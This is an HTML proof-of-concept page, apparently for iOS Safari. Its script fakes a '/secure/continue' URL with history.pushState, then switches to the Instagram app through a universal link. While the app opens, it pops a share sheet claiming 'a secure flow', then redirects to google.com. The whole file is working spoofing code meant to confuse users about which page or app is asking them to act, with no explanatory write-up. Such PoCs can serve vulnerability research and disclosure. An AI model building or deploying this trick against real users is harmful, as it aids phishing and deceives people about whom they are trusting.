<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>iOS App → Share → Navigation PoC</title>
<meta name="viewport" content="width=device-width,initial-scale=1">

<style>
body {
  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}
button {
  padding: 16px 28px;
  font-size: 16px;
}
</style>
</head>

<body>

<button id="go">Continue</button>

<script>
document.getElementById('go').onclick = async () => {

  /* Step 1: Trusted-looking in-page state */
  history.pushState({}, '', '/secure/continue');

  /* Step 2: Open app via Universal Link (iOS native) */
  location.href = 'https://www.instagram.com/instagram/';

  /* Step 3: While context switching, queue Share Sheet */
  setTimeout(async () => {
    if (navigator.share) {
      try {
        await navigator.share({
          title: 'Continue',
          text: 'Sharing from a secure flow.',
          url: location.href
        });
      } catch (e) {
        // user cancelled
      }
    }
  }, 120);

  /* Step 4: Final navigation to trusted site */
  setTimeout(() => {
    location.replace('https://www.google.com');
  }, 350);
};

/* Step 5: When returning from app / share */
window.addEventListener('pageshow', () => {
  history.replaceState({}, '', '/secure/continue');
});
</script>

</body>
</html>
